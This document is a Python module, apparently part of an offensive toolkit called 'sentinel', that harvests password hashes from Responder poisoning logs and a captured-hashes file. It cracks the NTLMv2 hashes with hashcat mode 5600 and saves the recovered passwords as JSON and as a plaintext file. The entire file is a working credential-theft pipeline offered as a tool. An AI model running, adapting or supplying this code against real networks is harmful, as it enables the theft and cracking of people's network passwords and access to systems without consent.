#!/usr/bin/env python3
"""
harvest.py — credential collection and hash cracking pipeline
Collects from Responder logs, relay output, and memory dumps
"""

import asyncio
import hashlib
import json
import logging
import os
import re
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

log = logging.getLogger("sentinel.harvest")

HASH_TYPES = {
    "ntlmv2": re.compile(r"\S+::\S+:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+"),
    "ntlm": re.compile(r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"),
    "lm": re.compile(r"[a-fA-F0-9]{32}"),
    "sha1": re.compile(r"[a-fA-F0-9]{40}"),
}

RESPONDER_LOG_DIRS = [
    Path("/usr/share/responder/logs"),
    Path("/opt/responder/logs"),
    Path("./logs"),
]


class HarvestEngine:
    def __init__(self, output_dir: Path, wordlist: Optional[str] = None):
        self.output_dir = output_dir
        self.wordlist = wordlist
        self.hashes = []

    def collect_hashes(self) -> List[Dict]:
        collected = []

        # from responder logs
        for log_dir in RESPONDER_LOG_DIRS:
            if log_dir.exists():
                for f in log_dir.glob("*.txt"):
                    collected.extend(self._parse_responder_log(f))

        # from sentinel output
        local_hashes = self.output_dir / "captured_hashes.txt"
        if local_hashes.exists():
            for line in local_hashes.read_text().splitlines():
                line = line.strip()
                if line:
                    collected.append({"raw": line, "type": self._detect_type(line)})

        # deduplicate
        seen = set()
        unique = []
        for h in collected:
            key = h.get("raw", "")
            if key not in seen:
                seen.add(key)
                unique.append(h)

        self.hashes = unique
        log.info(f"collected {len(unique)} unique hashes")
        return unique

    def _parse_responder_log(self, path: Path) -> List[Dict]:
        results = []
        try:
            content = path.read_text(errors="replace")
            for hash_type, pattern in HASH_TYPES.items():
                for match in pattern.finditer(content):
                    results.append({
                        "raw": match.group(0),
                        "type": hash_type,
                        "source": str(path)
                    })
        except Exception as e:
            log.debug(f"failed to parse {path}: {e}")
        return results

    def _detect_type(self, hash_str: str) -> str:
        for name, pattern in HASH_TYPES.items():
            if pattern.match(hash_str):
                return name
        return "unknown"

    async def crack_hashes(self, hashes: List[Dict]) -> List[Dict]:
        if not self.wordlist:
            log.warning("no wordlist provided — skipping crack")
            return []

        ntlmv2 = [h for h in hashes if h.get("type") == "ntlmv2"]
        if not ntlmv2:
            log.info("no NTLMv2 hashes to crack")
            return []

        hashes_file = self.output_dir / "to_crack.txt"
        hashes_file.write_text("\n".join(h["raw"] for h in ntlmv2))

        log.info(f"cracking {len(ntlmv2)} NTLMv2 hashes with hashcat")

        cracked_file = self.output_dir / "cracked.txt"

        try:
            proc = await asyncio.create_subprocess_exec(
                "hashcat",
                "-m", "5600",
                str(hashes_file),
                self.wordlist,
                "--outfile", str(cracked_file),
                "--quiet",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            await proc.wait()

            if cracked_file.exists():
                cracked = []
                for line in cracked_file.read_text().splitlines():
                    if ":" in line:
                        parts = line.rsplit(":", 1)
                        cracked.append({"hash": parts[0], "password": parts[1]})
                log.info(f"cracked {len(cracked)} passwords")
                return cracked

        except FileNotFoundError:
            log.error("hashcat not found — install: apt install hashcat")
        except Exception as e:
            log.error(f"crack error: {e}")

        return []

    def save_credentials(self, cracked: List[Dict]):
        out = self.output_dir / "credentials.json"
        out.write_text(json.dumps(cracked, indent=2))
        log.info(f"credentials saved to {out}")

        # also save as plaintext for easy grep
        plain = self.output_dir / "credentials.txt"
        with open(plain, "w") as f:
            for c in cracked:
                f.write(f"{c.get('hash', '')}:{c.get('password', '')}\n")
